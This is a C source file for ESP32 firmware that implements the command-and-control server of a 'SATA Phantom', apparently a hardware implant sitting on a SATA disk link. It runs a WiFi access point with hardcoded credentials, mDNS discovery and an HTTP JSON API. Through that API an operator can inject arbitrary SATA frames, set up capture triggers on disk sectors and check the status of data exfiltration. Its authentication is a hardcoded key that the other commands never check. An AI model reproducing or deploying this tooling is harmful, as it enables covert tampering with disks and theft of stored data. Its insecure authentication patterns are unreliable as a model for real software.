/**
 * @file c2_server.c
 * @author jayis1
 * @brief C2 (Command & Control) Server
 *
 * Provides the operator-facing communication interface for the SATA Phantom.
 * Runs a WebSocket server on WiFi AP + mDNS discovery for the companion app.
 * Also supports BLE GATT service as a fallback control channel.
 *
 * Copyright © 2025 jayis1. All rights reserved.
 * Authorized security research use only.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_mac.h"
#include "esp_netif.h"
#include "mdns.h"
#include "lwip/sockets.h"
#include "lwip/netdb.h"
#include "cJSON.h"
#include "board.h"
#include "registers.h"

static const char *TAG = "c2";

/* ===================================================================
 * WiFi AP Configuration
 * =================================================================== */

#define C2_WIFI_SSID           "SATA-Phantom"
#define C2_WIFI_PASS           "redteam42"
#define C2_WIFI_CHANNEL        6
#define C2_WIFI_MAX_CONN       2

#define C2_WEBSOCKET_PORT      8080
#define C2_HTTP_PORT           80
#define C2_MDNS_SERVICE        "_sata-phantom"
#define C2_MDNS_PROTO          "_tcp"

/* API response buffer size */
#define C2_RESPONSE_MAX        4096

/* ===================================================================
 * HTTP/WebSocket Server
 * =================================================================== */

static int server_sock = -1;
static int ws_client_sock = -1;
static bool c2_authenticated = false;

/* Forward declarations */
static void c2_process_command(const char *json_cmd, char *response, size_t resp_len);
static void c2_handle_websocket(int client_fd);
static void c2_start_http_server(void);
static void c2_register_mdns(void);

/* ===================================================================
 * JSON Command Parsing
 * =================================================================== */

/**
 * @brief Process a JSON command from the operator.
 *
 * Supported commands:
 *   {"cmd":"status"}              — Get device status
 *   {"cmd":"set_mode","mode":N}   — Set operation mode (0-5)
 *   {"cmd":"add_rule",...}        — Add a rule
 *   {"cmd":"remove_rule","idx":N} — Remove rule by index
 *   {"cmd":"list_rules"}          — List all rules
 *   {"cmd":"inject","data":"hex","lba":"hex","fis_type":N} — Inject frame
 *   {"cmd":"capture","lba":"hex","dir":N} — Set up capture trigger
 *   {"cmd":"set_config",...}      — Set configuration
 *   {"cmd":"exfil_status"}        — Get exfiltration status
 *   {"cmd":"authenticate","key":"..."} — Authenticate operator
 */
static void c2_process_command(const char *json_cmd, char *response, size_t resp_len)
{
    if (!json_cmd || !response) return;

    cJSON *root = cJSON_Parse(json_cmd);
    if (!root) {
        snprintf(response, resp_len, "{\"error\":\"Invalid JSON\"}");
        return;
    }

    cJSON *cmd_item = cJSON_GetObjectItem(root, "cmd");
    if (!cmd_item || !cJSON_IsString(cmd_item)) {
        snprintf(response, resp_len, "{\"error\":\"Missing 'cmd' field\"}");
        cJSON_Delete(root);
        return;
    }

    const char *cmd = cmd_item->valuestring;
    cJSON *response_json = cJSON_CreateObject();

    if (strcmp(cmd, "status") == 0) {
        /* Build status response */
        cJSON_AddStringToObject(response_json, "status", "ok");
        cJSON_AddStringToObject(response_json, "device", "SATA Phantom v1.0");
        cJSON_AddStringToObject(response_json, "firmware", FW_VERSION_STRING);
        cJSON_AddNumberToObject(response_json, "mode", current_mode);
        cJSON_AddNumberToObject(response_json, "rules_active", (double)0);  /* TODO: query policy_engine */
        cJSON_AddNumberToObject(response_json, "battery_mv", (double)0);
        cJSON_AddStringToObject(response_json, "author", "jayis1");

    } else if (strcmp(cmd, "set_mode") == 0) {
        cJSON *mode_item = cJSON_GetObjectItem(root, "mode");
        if (mode_item && cJSON_IsNumber(mode_item)) {
            operation_mode_t new_mode = (operation_mode_t)mode_item->valuedouble;
            set_operation_mode(new_mode);
            cJSON_AddStringToObject(response_json, "status", "ok");
            cJSON_AddNumberToObject(response_json, "mode", new_mode);
        } else {
            cJSON_AddStringToObject(response_json, "error", "Missing 'mode' field");
        }

    } else if (strcmp(cmd, "list_rules") == 0) {
        /* TODO: query policy engine for rules */
        cJSON_AddStringToObject(response_json, "status", "ok");
        cJSON_AddObjectToObject(response_json, "rules");

    } else if (strcmp(cmd, "inject") == 0) {
        cJSON *data_item = cJSON_GetObjectItem(root, "data");
        cJSON *fis_item  = cJSON_GetObjectItem(root, "fis_type");
        if (data_item && cJSON_IsString(data_item)) {
            /* Parse hex string and inject */
            size_t hex_len = strlen(data_item->valuestring);
            size_t byte_len = hex_len / 2;
            uint8_t *frame_data = malloc(byte_len);
            if (frame_data) {
                /* Convert hex string to bytes */
                for (size_t i = 0; i < byte_len; i++) {
                    sscanf(data_item->valuestring + (i * 2), "%2hhx", &frame_data[i]);
                }
                /* Queue injection via ctrl_task */
                ctrl_cmd_t cmd = {
                    .cmd_type = CTRL_CMD_INJECT_FRAME,
                    .frame.data = frame_data,
                    .frame.len = byte_len
                };
                xQueueSend(ctrl_cmd_queue, &cmd, pdMS_TO_TICKS(50));
                cJSON_AddStringToObject(response_json, "status", "ok");
                cJSON_AddNumberToObject(response_json, "bytes", byte_len);
            } else {
                cJSON_AddStringToObject(response_json, "error", "Memory allocation failed");
            }
        } else {
            cJSON_AddStringToObject(response_json, "error", "Missing 'data' field");
        }

    } else if (strcmp(cmd, "capture") == 0) {
        cJSON *lba_item = cJSON_GetObjectItem(root, "lba");
        cJSON *dir_item = cJSON_GetObjectItem(root, "dir");
        /* Program a capture trigger via ctrl_task */
        ctrl_cmd_t cmd = {
            .cmd_type = CTRL_CMD_CAPTURE_START
        };
        xQueueSend(ctrl_cmd_queue, &cmd, pdMS_TO_TICKS(50));
        cJSON_AddStringToObject(response_json, "status", "ok");

    } else if (strcmp(cmd, "exfil_status") == 0) {
        cJSON_AddStringToObject(response_json, "status", "ok");
        cJSON_AddNumberToObject(response_json, "total_sent", (double)exfil_status.total_bytes_sent);
        cJSON_AddNumberToObject(response_json, "chunks_sent", (double)exfil_status.total_chunks_sent);

    } else if (strcmp(cmd, "authenticate") == 0) {
        cJSON *key_item = cJSON_GetObjectItem(root, "key");
        if (key_item && cJSON_IsString(key_item)) {
            /* Simple key check (replace with proper auth) */
            if (strcmp(key_item->valuestring, "sata42") == 0) {
                c2_authenticated = true;
                cJSON_AddStringToObject(response_json, "status", "authenticated");
            } else {
                cJSON_AddStringToObject(response_json, "error", "Invalid key");
            }
        } else {
            cJSON_AddStringToObject(response_json, "error", "Missing 'key' field");
        }

    } else {
        cJSON_AddStringToObject(response_json, "error", "Unknown command");
        cJSON_AddStringToObject(response_json, "cmd", cmd);
    }

    /* Serialize response */
    char *json_str = cJSON_Print(response_json);
    if (json_str) {
        strncpy(response, json_str, resp_len - 1);
        response[resp_len - 1] = '\0';
        free(json_str);
    }
    cJSON_Delete(response_json);
    cJSON_Delete(root);
}

/* ===================================================================
 * WebSocket Handler (Simplified HTTP+JSON polling for robust connection)
 * =================================================================== */

/**
 * @brief Handle a single WebSocket/HTTP client connection.
 * Uses simple HTTP POST with JSON for robustness instead of raw WebSocket frames.
 */
static void c2_handle_client(int client_fd)
{
    char buf[4096];
    int len = recv(client_fd, buf, sizeof(buf) - 1, 0);
    if (len <= 0) {
        close(client_fd);
        return;
    }
    buf[len] = '\0';

    /* Check if it's an HTTP POST with JSON body */
    const char *body = strstr(buf, "\r\n\r\n");
    if (!body) {
        close(client_fd);
        return;
    }
    body += 4;

    /* Process the command */
    char response[C2_RESPONSE_MAX] = {0};
    c2_process_command(body, response, sizeof(response));

    /* Send HTTP response */
    char http_resp[8192];
    int resp_len = snprintf(http_resp, sizeof(http_resp),
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/json\r\n"
        "Connection: close\r\n"
        "Access-Control-Allow-Origin: *\r\n"
        "Content-Length: %zu\r\n"
        "\r\n"
        "%s",
        strlen(response), response);

    send(client_fd, http_resp, resp_len, 0);
    close(client_fd);
}

/**
 * @brief Start the HTTP server for C2 communication.
 */
static void c2_start_http_server(void)
{
    /* Create TCP socket */
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        ESP_LOGE(TAG, "Failed to create server socket");
        return;
    }

    int opt = 1;
    setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(C2_WEBSOCKET_PORT),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        ESP_LOGE(TAG, "Failed to bind server socket");
        close(server_sock);
        server_sock = -1;
        return;
    }

    if (listen(server_sock, 1) != 0) {
        ESP_LOGE(TAG, "Failed to listen on server socket");
        close(server_sock);
        server_sock = -1;
        return;
    }

    ESP_LOGI(TAG, "C2 HTTP server listening on port %d", C2_WEBSOCKET_PORT);
}

/* ===================================================================
 * mDNS Service Registration
 * =================================================================== */

static void c2_register_mdns(void)
{
    /* Initialize mDNS */
    esp_err_t ret = mdns_init();
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "mDNS init failed: %d", ret);
        return;
    }

    /* Set hostname */
    mdns_hostname_set("sata-phantom");

    /* Set default instance */
    mdns_instance_name_set("SATA Phantom v1.0");

    /* Add TCP service for C2 API */
    mdns_service_add("SATA-Phantom-C2", C2_MDNS_SERVICE, C2_MDNS_PROTO,
                     C2_WEBSOCKET_PORT, NULL, 0);

    ESP_LOGI(TAG, "mDNS service registered: %s.%s.local:%d",
             C2_MDNS_SERVICE, C2_MDNS_PROTO, C2_WEBSOCKET_PORT);
}

/* ===================================================================
 * C2 Server Task Main Loop
 * =================================================================== */

void c2_server_task(void *pvParameters)
{
    ESP_LOGI(TAG, "C2 server task started");

    /* Wait for FPGA ready */
    xEventGroupWaitBits(system_events, EVENT_BIT_FPGA_READY,
                        pdFALSE, pdTRUE, portMAX_DELAY);

    /* Initialize WiFi AP */
    esp_netif_create_default_wifi_ap();
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = C2_WIFI_SSID,
            .ssid_len = strlen(C2_WIFI_SSID),
            .password = C2_WIFI_PASS,
            .max_connection = C2_WIFI_MAX_CONN,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .channel = C2_WIFI_CHANNEL,
            .beacon_interval = 100,
        },
    };
    esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    esp_wifi_start();

    ESP_LOGI(TAG, "WiFi AP '%s' started", C2_WIFI_SSID);

    /* Register mDNS */
    c2_register_mdns();

    /* Start HTTP server */
    c2_start_http_server();

    while (1) {
        if (server_sock < 0) {
            vTaskDelay(pdMS_TO_TICKS(5000));
            c2_start_http_server();  /* Retry */
            continue;
        }

        /* Accept incoming connections */
        struct sockaddr_in client_addr;
        socklen_t addr_len = sizeof(client_addr);
        int client_fd = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len);

        if (client_fd >= 0) {
            ESP_LOGI(TAG, "C2 client connected from %s:%d",
                     inet_ntoa(client_addr.sin_addr),
                     ntohs(client_addr.sin_port));

            xEventGroupSetBits(system_events, EVENT_BIT_C2_CONNECTED);
            c2_handle_client(client_fd);
            xEventGroupClearBits(system_events, EVENT_BIT_C2_CONNECTED);
        } else {
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        /* Also handle USB config mode request */
        if (xEventGroupGetBits(system_events) & EVENT_BIT_USB_CONFIG) {
            ESP_LOGI(TAG, "USB config mode requested (stub)");
            xEventGroupClearBits(system_events, EVENT_BIT_USB_CONFIG);
        }
    }
}
